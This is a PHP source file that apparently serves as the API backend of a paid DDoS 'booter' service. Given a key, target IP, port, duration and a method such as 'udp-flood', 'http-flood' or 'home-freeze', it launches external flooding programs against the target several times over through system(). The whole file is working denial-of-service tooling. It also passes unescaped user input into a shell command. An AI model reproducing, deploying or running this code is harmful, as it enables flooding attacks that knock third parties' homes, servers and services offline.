<?php

$VALID_METHODS = [
    "udp-flood",
    "udp-bypass",
    "home-freeze",
    "http-flood",
    "vpn-drop"
];

ignore_user_abort(true);
set_time_limit(0);

ob_start();


if(!isset($_GET["time"]) == 1 || !isset($_GET["method"]) == 1|| !isset($_GET["ip"]) == 1 || !isset($_GET["port"]) == 1 || !isset($_GET["key"]) == 1){
    echo "Invalid parameters";
    die(); 
    return;
}

elseif(!in_array($_GET["method"],$VALID_METHODS)){
    echo "Invalid method";
    die();
    return;
}

$api_key = $_GET["key"];

if(md5($api_key) != "c64a64483a3a8a423da7bf29b4149e2b"){
    echo "Invalid API key.";
    die();
    return;
}


else{
    
    $time = $_GET["time"];
    $method = $_GET["method"];
    $port = $_GET["port"];
    $ip = $_GET["ip"];
    
    try{
        if(!is_numeric($port) || $port > 65535 || $port < 1){
            echo "Invalid port. Port ranges are 1-65535";  
            die();  
            return;     
        }elseif(!is_numeric($time) || $time > 4000){
            echo "Invalid time, your max attack time is 4000";
            die();
            return;
        }

        if (filter_var($ip, FILTER_VALIDATE_URL) === FALSE) {
            if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
                echo "Invalid IP";
                die();
                return;
            }
        }
    }
    catch(Exception $e){
        http_response_code(500);
        die();
        return;
    }

    switch($method){
        case "udp-flood":
            $command = "perl ../perl/udp.pl $ip $port 1024 $time";
        break;

        case "http-flood":
            $command = "cd ../go; ./http -i $ip -p $port -x 1000 -t $time";
        break;
        
        case "vpn-drop":
            $command = "perl ../perl/vpn.pl 3 $ip $port 1024 $time";
        break;

        case "udp-bypass":
            $command = "perl ../perl/byp.pl 4 4 $ip $port $time";
        break;
         
        case "home-freeze":
            $command = "cd ../c; ./tch $ip $port 250 1 $time";
        break;  
    }

    for($i = 0; $i < 4; $i++){
        system("$command > /dev/null 2>&1 &"); 
    }
    $response = ['Success' => 'Attack Started'];
    echo json_encode($response);             
}
?>
